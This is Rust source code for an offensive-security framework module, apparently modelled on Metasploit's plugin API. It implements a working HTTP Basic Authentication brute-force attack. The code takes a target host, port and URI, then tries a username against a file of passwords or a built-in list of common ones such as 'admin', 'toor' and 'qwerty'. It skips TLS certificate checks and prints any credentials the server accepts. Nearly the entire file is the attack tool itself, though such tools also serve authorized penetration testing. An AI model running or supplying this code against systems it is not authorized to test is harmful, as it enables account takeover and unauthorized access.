use amatsumara_api::*;
use std::ffi::{c_char, c_int, c_void, CStr};

static NAME: &str = "HTTP Basic Authentication Brute Force";
static DESCRIPTION: &str = "Attempts to brute force HTTP Basic Authentication credentials";
static AUTHOR: &str = "Amatsumara Project";

static PLATFORMS: &[Platform] = &[Platform::Linux, Platform::Windows, Platform::MacOS];
static ARCHS: &[Arch] = &[Arch::X64, Arch::X86, Arch::ARM64];

static RHOSTS_NAME: &str = "RHOSTS";
static RHOSTS_DESC: &str = "Target host";
static RHOSTS_DEFAULT: &str = "";

static RPORT_NAME: &str = "RPORT";
static RPORT_DESC: &str = "Target port";
static RPORT_DEFAULT: &str = "80";

static URI_NAME: &str = "TARGETURI";
static URI_DESC: &str = "Target URI path";
static URI_DEFAULT: &str = "/";

static SSL_NAME: &str = "SSL";
static SSL_DESC: &str = "Use HTTPS";
static SSL_DEFAULT: &str = "false";

static USERNAME_NAME: &str = "USERNAME";
static USERNAME_DESC: &str = "Single username to test";
static USERNAME_DEFAULT: &str = "admin";

static PASS_FILE_NAME: &str = "PASS_FILE";
static PASS_FILE_DESC: &str = "File containing passwords (one per line)";
static PASS_FILE_DEFAULT: &str = "";

static OPTIONS: &[ModuleOption] = &[
    ModuleOption {
        name: CString { ptr: RHOSTS_NAME.as_ptr() as *const c_char, len: RHOSTS_NAME.len() },
        description: CString { ptr: RHOSTS_DESC.as_ptr() as *const c_char, len: RHOSTS_DESC.len() },
        required: true,
        option_type: OptionType::Address,
        default_value: CString { ptr: RHOSTS_DEFAULT.as_ptr() as *const c_char, len: RHOSTS_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: RPORT_NAME.as_ptr() as *const c_char, len: RPORT_NAME.len() },
        description: CString { ptr: RPORT_DESC.as_ptr() as *const c_char, len: RPORT_DESC.len() },
        required: false,
        option_type: OptionType::Port,
        default_value: CString { ptr: RPORT_DEFAULT.as_ptr() as *const c_char, len: RPORT_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: URI_NAME.as_ptr() as *const c_char, len: URI_NAME.len() },
        description: CString { ptr: URI_DESC.as_ptr() as *const c_char, len: URI_DESC.len() },
        required: false,
        option_type: OptionType::String,
        default_value: CString { ptr: URI_DEFAULT.as_ptr() as *const c_char, len: URI_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: SSL_NAME.as_ptr() as *const c_char, len: SSL_NAME.len() },
        description: CString { ptr: SSL_DESC.as_ptr() as *const c_char, len: SSL_DESC.len() },
        required: false,
        option_type: OptionType::Bool,
        default_value: CString { ptr: SSL_DEFAULT.as_ptr() as *const c_char, len: SSL_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: USERNAME_NAME.as_ptr() as *const c_char, len: USERNAME_NAME.len() },
        description: CString { ptr: USERNAME_DESC.as_ptr() as *const c_char, len: USERNAME_DESC.len() },
        required: false,
        option_type: OptionType::String,
        default_value: CString { ptr: USERNAME_DEFAULT.as_ptr() as *const c_char, len: USERNAME_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: PASS_FILE_NAME.as_ptr() as *const c_char, len: PASS_FILE_NAME.len() },
        description: CString { ptr: PASS_FILE_DESC.as_ptr() as *const c_char, len: PASS_FILE_DESC.len() },
        required: false,
        option_type: OptionType::String,
        default_value: CString { ptr: PASS_FILE_DEFAULT.as_ptr() as *const c_char, len: PASS_FILE_DEFAULT.len() },
    },
];

static MODULE_INFO: ModuleInfo = ModuleInfo {
    api_version: MODULE_API_VERSION,
    metadata: ModuleMetadata {
        name: CString { ptr: NAME.as_ptr() as *const c_char, len: NAME.len() },
        description: CString { ptr: DESCRIPTION.as_ptr() as *const c_char, len: DESCRIPTION.len() },
        author: CString { ptr: AUTHOR.as_ptr() as *const c_char, len: AUTHOR.len() },
        module_type: ModuleType::Auxiliary,
        platforms: PlatformArray { ptr: PLATFORMS.as_ptr(), len: PLATFORMS.len() },
        archs: ArchArray { ptr: ARCHS.as_ptr(), len: ARCHS.len() },
        ranking: Ranking::Normal,
        privileged: false,
    },
    options: OptionArray { ptr: OPTIONS.as_ptr(), len: OPTIONS.len() },
};

struct BruteModule {
    rhost: String,
    rport: u16,
    uri: String,
    ssl: bool,
    username: String,
    pass_file: String,
}

impl BruteModule {
    fn new() -> Box<Self> {
        Box::new(Self {
            rhost: String::new(),
            rport: 80,
            uri: String::from("/"),
            ssl: false,
            username: String::from("admin"),
            pass_file: String::new(),
        })
    }

    fn get_default_passwords() -> Vec<&'static str> {
        vec![
            "admin", "password", "123456", "12345678", "root", "toor",
            "pass", "test", "guest", "oracle", "mysql", "administrator",
            "welcome", "monkey", "qwerty", "master", "passw0rd", "abc123",
        ]
    }

    fn try_auth(&self, password: &str) -> bool {
        let scheme = if self.ssl { "https" } else { "http" };
        let url = format!("{}://{}:{}{}", scheme, self.rhost, self.rport, self.uri);

        let client = match reqwest::blocking::Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(std::time::Duration::from_secs(5))
            .build() {
            Ok(c) => c,
            Err(_) => return false,
        };

        let auth = base64::encode(format!("{}:{}", self.username, password));

        match client.get(&url)
            .header("Authorization", format!("Basic {}", auth))
            .send() {
            Ok(response) => {
                let status = response.status().as_u16();
                status != 401 && status != 403
            }
            Err(_) => false,
        }
    }

    fn run_brute(&self) -> i32 {
        eprintln!("[*] Starting HTTP Basic Auth brute force");
        eprintln!("[*] Target: {}://{}:{}{}",
            if self.ssl { "https" } else { "http" },
            self.rhost, self.rport, self.uri);
        eprintln!("[*] Username: {}", self.username);
        eprintln!();

        let passwords: Vec<String> = if !self.pass_file.is_empty() {
            match std::fs::read_to_string(&self.pass_file) {
                Ok(content) => content.lines().map(|s| s.to_string()).collect(),
                Err(e) => {
                    eprintln!("[-] Failed to read password file: {}", e);
                    return -1;
                }
            }
        } else {
            Self::get_default_passwords().iter().map(|s| s.to_string()).collect()
        };

        eprintln!("[*] Testing {} passwords...", passwords.len());
        eprintln!();

        for password in passwords {
            if self.try_auth(&password) {
                eprintln!("[+] SUCCESS! Username: '{}' Password: '{}'", self.username, password);
                return 0;
            }
        }

        eprintln!("[-] No valid credentials found");
        -1
    }
}

extern "C" fn get_info() -> *const ModuleInfo {
    &MODULE_INFO
}

extern "C" fn init() -> *mut c_void {
    let module = BruteModule::new();
    Box::into_raw(module) as *mut c_void
}

extern "C" fn destroy(instance: *mut c_void) {
    if !instance.is_null() {
        unsafe {
            let _ = Box::from_raw(instance as *mut BruteModule);
        }
    }
}

extern "C" fn run(instance: *mut c_void, options_json: *const c_char) -> c_int {
    if instance.is_null() {
        eprintln!("[-] Module instance is null");
        return -1;
    }

    let module = unsafe { &mut *(instance as *mut BruteModule) };

    if !options_json.is_null() {
        let c_str = unsafe { CStr::from_ptr(options_json) };
        if let Ok(json_str) = c_str.to_str() {
            for line in json_str.split(',') {
                let parts: Vec<&str> = line.split(':').collect();
                if parts.len() == 2 {
                    let key = parts[0].trim().trim_matches(|c| c == '{' || c == '"' || c == '}');
                    let value = parts[1].trim().trim_matches(|c| c == '"' || c == '}');

                    match key {
                        "RHOSTS" => module.rhost = value.to_string(),
                        "RPORT" => {
                            if let Ok(port) = value.parse::<u16>() {
                                module.rport = port;
                            }
                        }
                        "TARGETURI" => module.uri = value.to_string(),
                        "SSL" => module.ssl = value.eq_ignore_ascii_case("true"),
                        "USERNAME" => module.username = value.to_string(),
                        "PASS_FILE" => module.pass_file = value.to_string(),
                        _ => {}
                    }
                }
            }
        }
    }

    if module.rhost.is_empty() {
        eprintln!("[-] RHOSTS not set");
        return -1;
    }

    module.run_brute()
}

static VTABLE: ModuleVTable = ModuleVTable {
    get_info,
    init,
    destroy,
    check: None,
    run,
};

#[no_mangle]
pub extern "C" fn msf_module_init() -> *const ModuleVTable {
    &VTABLE
}
